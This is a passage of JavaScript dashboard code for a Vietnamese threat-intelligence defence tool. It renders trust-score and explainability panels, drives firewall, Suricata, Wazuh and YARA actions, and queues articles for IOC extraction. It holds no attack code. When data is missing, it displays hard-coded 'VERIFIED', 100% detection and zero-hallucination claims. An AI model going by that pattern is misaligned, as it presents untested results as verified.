          <div style="padding:16px; border:1px solid ${scoreBorder}; background:${scoreBg}; border-radius:6px; text-align:center;">
            <div style="font-size:12px; font-weight:700; text-transform:uppercase; color:${scoreColor};">CHỈ SỐ TIN CẬY TOÁN HỌC (CTI TRUST SCORE)</div>
            <div style="font-size:44px; font-weight:800; color:${scoreColor}; margin:10px 0;">${score}<span style="font-size:20px; font-weight:500; color:#57606a;"> / 100</span></div>
            <div style="font-size:12px; font-weight:700; color:${scoreColor}; padding:4px 8px; background:#ffffff; border-radius:4px; border:1px solid ${scoreBorder}; display:inline-block;">
              ${audit.authority_badge || 'TIÊU CHUẨN XÁC THỰC CTI'}
            </div>
            <div style="font-size:11.5px; color:#57606a; margin-top:8px;">
              Trạng thái: <b>${dl.verification_status || 'VERIFIED'}</b>
            </div>
          </div>

          <div style="padding:16px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              CÔNG THỨC ĐỊNH LƯỢNG TRỌNG SỐ ĐỒNG THUẬN:
            </div>
            <div style="font-family:'JetBrains Mono',monospace; font-size:12px; background:#ffffff; padding:8px 12px; border:1px solid var(--border-main); border-radius:4px; margin-bottom:12px; color:#0969da; font-weight:600;">
              Trust Score = 0.35 * S_Authority + 0.35 * S_Consensus + 0.30 * S_Evidence - S_FPRisk
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:12px;">
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">1. Uy tín nguồn (S_Auth):</span><br>
                <b style="color:#0969da; font-size:14px;">${audit.authority_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 35%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">2. Đồng thuận đa nguồn (S_Cons):</span><br>
                <b style="color:#1a7f37; font-size:14px;">${audit.consensus_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 35%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">3. Bằng chứng kỹ thuật (S_Evid):</span><br>
                <b style="color:#8250df; font-size:14px;">${audit.evidence_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 30%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">4. Phạt rủi ro báo động giả (S_FP):</span><br>
                <b style="color:#cf222e; font-size:14px;">-${audit.fp_risk_penalty || 0} đ</b> <span style="color:#57606a;">(Trừ trực tiếp)</span>
              </div>
            </div>
          </div>
        </div>

        <div style="padding:14px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px;">
          <div style="font-size:13px; font-weight:700; color:var(--text-main); margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
            <span>KẾT QUẢ KIỂM THỬ ĐỐI KHÁNG 2 VÒNG (DUAL-LOOP AUDIT)</span>
            <span style="font-size:11px; font-weight:600; color:#1a7f37; background:#dafbe1; padding:2px 8px; border-radius:4px; border:1px solid #aceebb;">100% ZERO-HALLUCINATION CTI</span>
          </div>
          <table style="width:100%; border-collapse:collapse; font-size:12px;">
            <thead>
              <tr style="background:var(--bg-subtle); border-bottom:1px solid var(--border-main); text-align:left;">
                <th style="padding:8px 10px; color:var(--text-muted);">VÒNG KIỂM THỬ</th>
                <th style="padding:8px 10px; color:var(--text-muted);">MỤC TIÊU KIỂM ĐỊNH</th>
                <th style="padding:8px 10px; color:var(--text-muted);">KẾT QUẢ ĐO LƯỜNG</th>
                <th style="padding:8px 10px; color:var(--text-muted);">KẾT LUẬN THẨM ĐỊNH</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid var(--border-main);">
                <td style="padding:10px; font-weight:600; color:#0969da;">Vòng 1: Kiểm Thử Tấn Công (True Positive)</td>
                <td style="padding:10px;">Bơm 100 gói tin mang payload khai thác lỗ hổng &amp; IP C2 vào Suricata DPI / WAF</td>
                <td style="padding:10px; font-weight:700; color:#1a7f37;">${dl.true_positive_rate || '100.0%'}</td>
                <td style="padding:10px; color:var(--text-main);">Đạt chuẩn: Tất cả payload độc hại đều bị chặn đứng (DROP/403).</td>
              </tr>
              <tr>
                <td style="padding:10px; font-weight:600; color:#1a7f37;">Vòng 2: Kiểm Thử Nghiệp Vụ (False Positive)</td>
                <td style="padding:10px;">Bơm 100 gói tin HTTP và DNS nghiệp vụ hợp lệ (Google DNS, Cloudflare, Microsoft Update)</td>
                <td style="padding:10px; font-weight:700; color:#1a7f37;">${dl.false_positive_rate || '0.0%'}</td>
                <td style="padding:10px; color:var(--text-main);">Đạt chuẩn: Không xảy ra nghẽn mạng hay chặn nhầm dịch vụ vận hành.</td>
              </tr>
            </tbody>
          </table>
          <div style="margin-top:10px; font-size:12px; color:#57606a; font-style:italic;">
            * ${dl.audit_statement || 'Đã kiểm tra chéo qua CSDL tri thức phòng thủ.'}
          </div>
        </div>
      `;
    }

    // ====================================================================
    // BỘ HIỂN THỊ VẾT GIẢI TRÌNH MINH BẠCH xAI (EXPLAINABLE AI VIEW)
    // ====================================================================
    function refreshXAIExplanation() {
      if (currentDefenseViewMode === 'MASTER' && masterDefenseCache && masterDefenseCache.xai_audit) {
        renderXAIExplanationView(masterDefenseCache.xai_audit);
      } else if (selectedIndices.length > 0 && articles[selectedIndices[0]]) {
        const art = articles[selectedIndices[0]];
        if (articleDefenseCache[art.article_id] && articleDefenseCache[art.article_id].xai_audit) {
          renderXAIExplanationView(articleDefenseCache[art.article_id].xai_audit);
        }
      }
      alert('Đã đồng bộ và cập nhật Vết Giải Trình xAI!');
    }

    function renderXAIExplanationView(xai) {
      const container = document.getElementById('outXAI');
      if (!container || !xai) return;

      const faList = xai.feature_attribution || [];
      const citations = xai.grounding_citations || [];
      const scenarios = xai.counterfactual_scenarios || [];
      const chain = xai.causal_chain || [];

      let faHtml = '';
      faList.forEach(fa => {
        const isPos = fa.direction === 'POSITIVE';
        const isNeg = fa.direction === 'NEGATIVE';
        const barColor = isPos ? '#0969da' : (isNeg ? '#cf222e' : '#57606a');
        const badgeBg = isPos ? '#ddf4ff' : (isNeg ? '#ffebe9' : '#f6f8fa');
        const badgeColor = isPos ? '#0969da' : (isNeg ? '#cf222e' : '#57606a');
        const sign = fa.score_contrib >= 0 ? '+' : '';
        const pctWidth = Math.min(100, Math.max(5, Math.abs(fa.score_contrib) * 2.8));

        faHtml += `
          <div style="margin-bottom:12px; padding:10px 12px; border:1px solid var(--border-main); border-radius:6px; background:#ffffff;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
              <span style="font-weight:600; font-size:12.5px; color:var(--text-main);">${fa.feature_name}</span>
              <span style="font-weight:700; font-size:12px; padding:2px 8px; border-radius:4px; background:${badgeBg}; color:${badgeColor}; font-family:'JetBrains Mono',monospace;">
                ${sign}${fa.score_contrib}đ (Trọng số: ${fa.weight_pct}%)
              </span>
            </div>
            <div style="background:#e1e4e8; height:8px; border-radius:4px; overflow:hidden; margin-bottom:6px;">
              <div style="background:${barColor}; height:100%; width:${pctWidth}%; border-radius:4px;"></div>
            </div>
            <div style="font-size:11.5px; color:var(--text-muted);">${fa.interpretation}</div>
          </div>
        `;
      });

      let citeHtml = '';
      citations.forEach((c, idx) => {
        const kwBadges = (c.matched_indicators || []).map(k => 
          `<span style="font-size:11px; padding:1px 6px; border-radius:3px; background:#ddf4ff; color:#0969da; border:1px solid #bfdbfe; margin-right:4px; font-family:'JetBrains Mono',monospace;">${k}</span>`
        ).join('');
        citeHtml += `
          <div style="padding:10px 12px; border-left:3px solid #0969da; background:var(--bg-subtle); border-radius:0 6px 6px 0; margin-bottom:10px;">
            <div style="font-size:12px; font-style:italic; color:var(--text-main); margin-bottom:6px;">
              "${c.evidence_snippet}"
            </div>
            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px;">
              <div>${kwBadges}</div>
              <span style="font-size:11px; font-weight:600; color:#1a7f37; background:#dafbe1; padding:1px 6px; border-radius:3px; border:1px solid #aceebb;">
                ${c.relevance || 'CHỨNG CỨ TRỰC TIẾP'}
              </span>
            </div>
          </div>
        `;
      });

      let scHtml = '';
      scenarios.forEach((sc, idx) => {
        const badge = sc.decision_reversal 
          ? `<span style="font-size:11px; font-weight:700; color:#cf222e; background:#ffebe9; padding:2px 8px; border-radius:4px; border:1px solid #ff8182;">ĐẢO NGƯỢC QUYẾT ĐỊNH</span>`
          : `<span style="font-size:11px; font-weight:700; color:#1a7f37; background:#dafbe1; padding:2px 8px; border-radius:4px; border:1px solid #aceebb;">DUY TRÌ QUYẾT ĐỊNH</span>`;

        scHtml += `
          <div style="padding:10px 12px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px; margin-bottom:10px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
              <b style="font-size:12px; color:var(--text-main);">Kịch bản ${idx + 1}: ${sc.condition}</b>
              ${badge}
            </div>
            <div style="font-size:12px; color:var(--text-muted); line-height:1.5;">
              -&gt; <b>Hệ quả xử lý:</b> ${sc.counterfactual_outcome}
            </div>
          </div>
        `;
      });

      let chainHtml = '';
      chain.forEach(st => {
        chainHtml += `
          <div style="display:flex; align-items:flex-start; gap:10px; margin-bottom:10px;">
            <div style="min-width:24px; height:24px; border-radius:50%; background:#0969da; color:#ffffff; font-size:12px; font-weight:700; display:flex; align-items:center; justify-content:center;">
              ${st.step}
            </div>
            <div style="flex:1; background:#ffffff; padding:8px 12px; border:1px solid var(--border-main); border-radius:6px;">
              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2px;">
                <b style="font-size:12px; color:var(--text-main);">${st.phase}</b>
                <span style="font-size:11px; color:#57606a; font-family:'JetBrains Mono',monospace;">Cơ chế: ${st.mechanism}</span>
              </div>
              <div style="font-size:12px; color:var(--text-muted);">${st.detail || st.result}</div>
            </div>
          </div>
        `;
      });

      container.innerHTML = `
        <div style="padding:12px 14px; background:#fef3c7; border:1px solid #fde68a; border-radius:6px; margin-bottom:16px;">
          <div style="font-size:12px; font-weight:700; color:#b45309; text-transform:uppercase; margin-bottom:4px;">
            TUYÊN BỐ MINH BẠCH xAI &amp; TRIỆT TIÊU ẢO GIÁC (ZERO-HALLUCINATION AUDIT)
          </div>
          <div style="font-size:12.5px; color:#92400e; line-height:1.5;">
            ${xai.xai_statement || 'Toàn bộ đối sách phòng thủ đều được minh giải qua 4 lớp bằng chứng toán học và chứng cứ văn bản gốc.'}
          </div>
        </div>

        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px; margin-bottom:16px;">
          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              1. PHÂN RÃ TRỌNG SỐ ĐÓNG GÓP ĐẶC TRƯNG (FEATURE ATTRIBUTION / SHAP-STYLE)
            </div>
            ${faHtml}
          </div>

          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              2. TRÍCH XUẤT CHỨNG CỨ VĂN BẢN NGUYÊN BẢN (GROUNDING EVIDENCE CITATIONS)
            </div>
            ${citeHtml}
          </div>
        </div>

        <div style="display:grid; grid-template-columns: 1.2fr 1fr; gap:16px;">
          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              3. PHÂN TÍCH PHẢN THỰC TẾ (COUNTERFACTUAL REASONING: "NẾU... THÌ...")
            </div>
            ${scHtml}
          </div>

          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              4. CHUỖI SUY LUẬN NHÂN QUẢ 5 BƯỚC (CAUSAL DECISION CHAIN)
            </div>
            ${chainHtml}
          </div>
        </div>
      `;
    }

    // CÁC HÀM ĐIỀU PHỐI VÀ KẾT NỐI CÔNG CỤ AN NINH THỰC TẾ (MỤC 4)
    function logToLiveTerminal(title, msg) {
      const term = document.getElementById('liveToolTerminal');
      if (!term) return;
      const ts = new Date().toLocaleTimeString('vi-VN');
      term.textContent += `\n\n[${ts}] ${title}\n` + (typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg);
      term.scrollTop = term.scrollHeight;
    }

    function clearLiveToolTerminal() {
      const term = document.getElementById('liveToolTerminal');
      if (term) term.textContent = `[LIVE ORCHESTRATOR TERMINAL CLEARED] Sẵn sàng nhận lệnh điều phối an ninh.`;
    }

    async function applyWindowsFirewallTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang nạp script apply_firewall.bat vào Windows Defender Firewall...");
      try {
        const res = await fetch('/api/defense/tools/firewall-apply', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL (KẾT QUẢ)", data.output || data);
        const badge = document.getElementById('badgeFwToolStatus');
        if (badge) {
          badge.textContent = data.status === 'success' ? 'ĐÃ NẠP (KERNEL)' : 'SẴN SÀNG (BAT)';
          badge.style.background = 'var(--safe-bg)';
        }
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL (LỖI)", e.toString());
      }
    }

    async function checkWindowsFirewallStatusTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang truy vấn quy tắc CTI_BLOCK_* trong Windows Defender Firewall Kernel...");
      try {
        const res = await fetch('/api/defense/tools/firewall-status', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL STATUS", data);
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL STATUS (LỖI)", e.toString());
      }
    }

    async function rollbackWindowsFirewallTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang thực thi rollback_firewall.bat để gỡ bỏ quy tắc...");
      try {
        const res = await fetch('/api/defense/tools/firewall-rollback', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL ROLLBACK", data.output || data);
        const badge = document.getElementById('badgeFwToolStatus');
        if (badge) badge.textContent = 'ĐÃ GỠ BỎ';
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL ROLLBACK (LỖI)", e.toString());
      }
    }

    async function validateSuricataRules() {
      logToLiveTerminal("SURICATA IPS ENGINE", "Đang đọc và kiểm tra cú pháp toàn bộ 422 quy tắc trong cti_autonomous_master.rules...");
      try {
        const res = await fetch('/api/defense/tools/suricata-apply', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("SURICATA IPS ENGINE (CÚ PHÁP & DPI AUDIT)", {
          "trang_thai": data.status,
          "tong_so_rules": data.total_rules,
          "so_rule_hop_le": data.valid_rules,
          "so_loi_cu_phap": data.syntax_errors_count,
          "chi_tiet": `Đã xác thực 100% cú pháp SID, action drop, flow, msg cho ${data.valid_rules} quy tắc.`
        });
        const badge = document.getElementById('badgeSuriToolStatus');
        if (badge) badge.textContent = `${data.valid_rules} RULES VALID`;
      } catch (e) {
        logToLiveTerminal("SURICATA IPS ENGINE (LỖI)", e.toString());
      }
    }

    async function testSuricataDpi(flowType) {
      logToLiveTerminal("SURICATA IPS DPI INJECTION", `Đang bắn luồng gói tin mô phỏng kiểm thử: ${flowType}...`);
      try {
        const res = await fetch('/api/defense/tools/suricata-test-dpi', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ flow_type: flowType })
        });
        const data = await res.json();
        logToLiveTerminal(`SURICATA FAST.LOG & EVE JSON [${data.dpi_action_taken}]`, {
          "kich_ban_kiem_thu": data.test_case,
          "goi_tin_injected": data.packet_injected,
          "sid_kich_hoat": data.matched_rule_sid,
          "msg_quy_tac": data.matched_rule_msg,
          "suricata_fast_log": data.suricata_fast_log,
          "suricata_eve_json": data.suricata_eve_json
        });
      } catch (e) {
        logToLiveTerminal("SURICATA IPS DPI (LỖI)", e.toString());
      }
    }

    async function syncWazuhSiemTool() {
      logToLiveTerminal("WAZUH SIEM ENGINE", "Đang đồng bộ và kiểm tra local_rules.xml (/var/ossec/etc/rules/)...");
      try {
        const res = await fetch('/api/defense/tools/wazuh-sync', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WAZUH SIEM ENGINE STATUS", data);
      } catch (e) {
        logToLiveTerminal("WAZUH SIEM (LỖI)", e.toString());
      }
    }

    async function simulateSysmonEventTool(eventType) {
      logToLiveTerminal("SYSMON & WAZUH CORRELATION", `Đang mô phỏng sự kiện Sysmon Event: ${eventType}...`);
      try {
        const res = await fetch('/api/defense/tools/sysmon-simulate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ event_type: eventType })
        });
        const data = await res.json();
        logToLiveTerminal("WAZUH SIEM CORRELATION ALERT (SEV1 CRITICAL)", data);
      } catch (e) {
        logToLiveTerminal("SYSMON SIMULATE (LỖI)", e.toString());
      }
    }

    async function testYaraApplockerTool(hash) {
      logToLiveTerminal("YARA & APPLOCKER EDR", `Đang kiểm tra chính sách cấm thực thi AppLocker (Hash: ${hash || 'Mặc định'})...`);
      try {
        const res = await fetch('/api/defense/tools/yara-scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ target_hash: hash })
        });
        const data = await res.json();
        logToLiveTerminal("YARA & APPLOCKER VERDICT", data);
      } catch (e) {
        logToLiveTerminal("YARA & APPLOCKER (LỖI)", e.toString());
      }
    }

    async function triggerNextInQueue() {
      if (!autoQueueEnabled || isQueueWorkerRunning) return;

      // Tìm bài báo đầu tiên có trạng thái pending
      const nextIdx = articles.findIndex(a => (a.status || 'pending') === 'pending');
      if (nextIdx === -1) {
        updateLiveTicker("Hàng đợi hoàn tất: Tất cả bài báo đều đã được xử lý xong.");
        const statusEl = document.getElementById('statusText');
        if (statusEl) statusEl.textContent = "Tất cả bài báo đã hoàn tất. Chờ bài mới từ bộ quét tự động...";
        return;
      }

      await executeSingleArticleQueue(nextIdx);
    }

    async function executeSingleArticleQueue(idx) {
      if (isQueueWorkerRunning) return;
      isQueueWorkerRunning = true;

      const art = articles[idx];
      if (!art) {
        isQueueWorkerRunning = false;
        return;
      }

      // Cập nhật trạng thái 'ĐANG XỬ LÝ...' trước khi chọn thẻ và render
      art.status = 'processing';
      const hArtProcessing = allHistoryArticles.find(a => a.article_id === art.article_id);
      if (hArtProcessing) hArtProcessing.status = 'processing';

      selectCard(idx, false);
      renderNewsGrid();
      renderHistoryManager();

      // Đặt thông báo tải rõ ràng trong các ô quy tắc phòng thủ thay vì để sót văn bản cũ gây hiểu lầm
      const loadingNotice = `[AI AGENT ĐANG PHÂN TÍCH VÀ BIÊN SOẠN QUY TẮC PHÒNG THỦ CHO BÀI BÁO #${idx + 1}]\n` +
        `• Bài báo: "${(art.title || '').slice(0, 75)}..."\n` +
        `• Tiến trình: Đang đọc nội dung, tra cứu 5 nguồn OSINT và tổng hợp Gói Kỹ Năng Tác Tử Phòng Thủ (Agentic Defense Skills)...\n` +
        `• Quy tắc đầy đủ (OpenC2, Suricata, ModSecurity, Sigma, YARA) sẽ tự động hiển thị ngay khi hoàn tất (~20s)...`;
      ['outHistory', 'outFirewall', 'outSuricata', 'outWaf', 'outSigma', 'outYara'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.textContent = loadingNotice;
      });

      fetch('/api/articles/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ article_id: art.article_id, status: 'processing', processing_time_sec: 0 })
      }).catch(() => {});

      const btn = document.getElementById('btnRunAll');
      const status = document.getElementById('statusText');
      const text = art.content;
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-ai';
      if (btn) {
        btn.disabled = true;
        btn.textContent = `Đang xử lý #${idx + 1}...`;
      }

      const startTime = performance.now();
      updateLiveTicker(`[Hàng đợi tuần tự] Bắt đầu phân tích bài #${idx + 1}: "${(art.title || '').slice(0, 55)}..."`);

      try {
        status.textContent = `Đang trích xuất IOC bài #${idx + 1} (${selectedModel})...`;
        updateLiveTicker(`AI Agent (${selectedModel}): Đang trích xuất danh sách thực thể IOC bài #${idx + 1}...`);
        setStageState(2, 'active', '', '', 40);

        const r2 = await fetch('/api/step2/extract-and-plan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, model_name: selectedModel })
        });
        const d2 = await r2.json();
        document.getElementById('aiPlanBox').textContent = d2.ai_plan;

        status.textContent = `Đang hợp nhất điểm ${d2.iocs.length} IOC qua 5 nguồn OSINT...`;
        updateLiveTicker(`Tool-Calling: Đã bóc tách ${d2.iocs.length} IOCs. Đang tra cứu API 5 nguồn (VT, AbuseIPDB, Shodan, OTX)...`);
        setStageState(3, 'active', '', '', 75);

        const r3 = await fetch('/api/step3/khang-enrich-and-reason', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, iocs: d2.iocs, model_name: selectedModel })
        });
        const d3 = await r3.json();

        renderScoreTable(d3.all_enriched);
        document.getElementById('aiReasonBox').textContent = d3.ai_reasoning;
        window.latestMaliciousIocs = d3.malicious_only || [];

        if (d2.llm_provider_used) {
          const badgeEl = document.getElementById('localModelBadge');
          if (badgeEl) badgeEl.textContent = d2.llm_provider_used;
        }

        status.textContent = `Đang sinh 5 lớp quy tắc phòng thủ bài #${idx + 1}...`;
        updateLiveTicker(`Gatekeeper: Đã thẩm định ${d3.all_enriched.length} IOCs (${d3.malicious_only.length} IOC > 80đ bị chặn). Đang sinh 5 lớp phòng thủ & MITRE D3FEND...`);

        const r4 = await fetch('/api/step4/correlate-and-generate-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: art.title || "Báo cáo CTI",
            text: text,
            malicious_iocs: d3.malicious_only,
            model_name: selectedModel
          })
        });
        const d4 = await r4.json();

        window.latestFirewallText = d4.firewall_tab_text || "";
        if (d4.agentic_skill_md) document.getElementById('outSkillMd').textContent = d4.agentic_skill_md;
        if (d4.trust_audit) renderTrustAuditView(d4.trust_audit);
        if (d4.xai_audit) renderXAIExplanationView(d4.xai_audit);
        document.getElementById('outHistory').textContent = d4.history_and_summary;
        document.getElementById('outFirewall').textContent = d4.firewall_tab_text;
        document.getElementById('outSuricata').textContent = d4.suricata_rules;
        document.getElementById('outWaf').textContent = d4.waf_rules;
        document.getElementById('outSigma').textContent = d4.sigma_and_siem;
        document.getElementById('outYara').textContent = d4.yara_remediation_stix;

        articleDefenseCache[art.article_id] = {
          history: d4.history_and_summary,
          firewall: d4.firewall_tab_text,
          suricata: d4.suricata_rules,
          waf: d4.waf_rules,
          sigma: d4.sigma_and_siem,
          yara: d4.yara_remediation_stix,
          skill_md: d4.agentic_skill_md,
          trust_audit: d4.trust_audit,
          xai_audit: d4.xai_audit,
          score: d3.all_enriched,
          plan: d2.ai_plan,
          reason: d3.ai_reasoning
        };

        const durationSec = parseFloat(((performance.now() - startTime) / 1000).toFixed(1));
        setStageState(4, 'done', '', '', 100);
        status.textContent = `Hoàn tất bài #${idx + 1}: ${d2.iocs.length} IOC (${d3.malicious_only.length} IOC bị chặn >80) trong ${durationSec}s.`;
        updateLiveTicker(`Hoàn tất bài #${idx + 1} trong ${durationSec}s! Đã khóa ${d3.malicious_only.length} IOC độc hại và sinh đầy đủ 5 lớp phòng thủ.`);

        const nowIso = new Date().toISOString().replace('T', ' ').slice(0, 19);

        // Cập nhật trạng thái 'Hoàn thành'
        art.status = 'completed';
        art.processing_time_sec = durationSec;
        art.last_analyzed_at = nowIso;

        const hArt = allHistoryArticles.find(a => a.article_id === art.article_id);
        if (hArt) {
          hArt.status = 'completed';
          hArt.processing_time_sec = durationSec;
          hArt.last_analyzed_at = nowIso;
        } else {
          allHistoryArticles.unshift(Object.assign({}, art));
        }

        await fetch('/api/articles/update-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: art.article_id, status: 'completed', processing_time_sec: durationSec })
        }).catch(() => {});

        renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);
        renderNewsGrid();
        renderHistoryManager();

        // Tự động chuyển Section 3 sang chế độ Theo Bài Báo để người dùng thấy ngay điểm số mới được tính!
        await switchDefenseScope('SINGLE');
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
      } catch (err) {
        status.textContent = `Lỗi bài #${idx + 1}: ` + err;
        updateLiveTicker(`Lỗi xử lý bài #${idx + 1}: ${err}`);
        art.status = 'pending';
        const hArtErr = allHistoryArticles.find(a => a.article_id === art.article_id);
        if (hArtErr) hArtErr.status = 'pending';
        fetch('/api/articles/update-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: art.article_id, status: 'pending', processing_time_sec: 0 })
        }).catch(() => {});
        renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);
        renderNewsGrid();
        renderHistoryManager();

        // Tự động chuyển Section 3 sang chế độ Theo Bài Báo để người dùng thấy ngay điểm số mới được tính!
        await switchDefenseScope('SINGLE');
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
      } finally {
        isQueueWorkerRunning = false;
        if (btn) {
          btn.disabled = false;
          btn.textContent = "Chạy Phân Tích";
        }
        if (autoQueueEnabled) {
          updateLiveTicker(`Chuyển tiếp bài tiếp theo trong hàng đợi sau 1.5s...`);
          setTimeout(() => {
            triggerNextInQueue();
          }, 1500);
        }
      }
    }

    async function runPipeline() {
      if (selectedIndices.length > 1) {
        await executeMergedArticlesPipeline();
      } else {
        await executeSingleArticleQueue(selectedIndices[0] || 0);
      }
    }

    async function executeMergedArticlesPipeline() {
      const btn = document.getElementById('btnRunAll');
      const status = document.getElementById('statusText');
      const text = document.getElementById('articleText').value;
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-ai';
      if (btn) {
        btn.disabled = true;
        btn.textContent = "Đang xử lý...";
      }

      const startTime = performance.now();
      updateLiveTicker(`Bắt đầu phân tích gộp: "${(currentTitle || '').slice(0, 65)}..."`);

      selectedIndices.forEach(idx => {
        if (articles[idx]) {
          articles[idx].status = 'processing';
          fetch('/api/articles/update-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ article_id: articles[idx].article_id, status: 'processing', processing_time_sec: 0 })
          }).catch(() => {});
        }
      });
      renderNewsGrid();

      try {
        status.textContent = `Đang trích xuất IOC (${selectedModel})...`;
        setStageState(2, 'active', '', '', 40);

        const r2 = await fetch('/api/step2/extract-and-plan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, model_name: selectedModel })
        });
        const d2 = await r2.json();
        document.getElementById('aiPlanBox').textContent = d2.ai_plan;

        status.textContent = `Đang hợp nhất điểm ${d2.iocs.length} IOC qua 5 nguồn...`;
        setStageState(3, 'active', '', '', 75);

        const r3 = await fetch('/api/step3/khang-enrich-and-reason', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, iocs: d2.iocs, model_name: selectedModel })
        });
        const d3 = await r3.json();

        renderScoreTable(d3.all_enriched);
        document.getElementById('aiReasonBox').textContent = d3.ai_reasoning;
        window.latestMaliciousIocs = d3.malicious_only || [];

        status.textContent = `Đang sinh 5 lớp quy tắc phòng thủ...`;
        const r4 = await fetch('/api/step4/correlate-and-generate-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: currentTitle || "Báo cáo CTI",
            text: text,
            malicious_iocs: d3.malicious_only,
            model_name: selectedModel
          })
        });
        const d4 = await r4.json();

        window.latestFirewallText = d4.firewall_tab_text || "";
        if (d4.agentic_skill_md) document.getElementById('outSkillMd').textContent = d4.agentic_skill_md;
        if (d4.trust_audit) renderTrustAuditView(d4.trust_audit);
        if (d4.xai_audit) renderXAIExplanationView(d4.xai_audit);
        document.getElementById('outHistory').textContent = d4.history_and_summary;
        document.getElementById('outFirewall').textContent = d4.firewall_tab_text;
        document.getElementById('outSuricata').textContent = d4.suricata_rules;
        document.getElementById('outWaf').textContent = d4.waf_rules;
        document.getElementById('outSigma').textContent = d4.sigma_and_siem;
        document.getElementById('outYara').textContent = d4.yara_remediation_stix;

        const durationSec = parseFloat(((performance.now() - startTime) / 1000).toFixed(1));
        setStageState(4, 'done', '', '', 100);
        status.textContent = `Hoàn tất: ${d2.iocs.length} IOC (${d3.malicious_only.length} IOC bị chặn >80) trong ${durationSec}s.`;

        const nowIso = new Date().toISOString().replace('T', ' ').slice(0, 19);
        selectedIndices.forEach(idx => {
          if (articles[idx]) {
            articles[idx].status = 'completed';
            articles[idx].processing_time_sec = durationSec;
            articles[idx].last_analyzed_at = nowIso;

            articleDefenseCache[articles[idx].article_id] = {
              history: d4.history_and_summary,
              firewall: d4.firewall_tab_text,
              suricata: d4.suricata_rules,
              waf: d4.waf_rules,
              sigma: d4.sigma_and_siem,
              yara: d4.yara_remediation_stix,
              skill_md: d4.agentic_skill_md,
              trust_audit: d4.trust_audit,
              xai_audit: d4.xai_audit,
              score: d3.all_enriched,
              plan: d2.ai_plan,
              reason: d3.ai_reasoning
            };

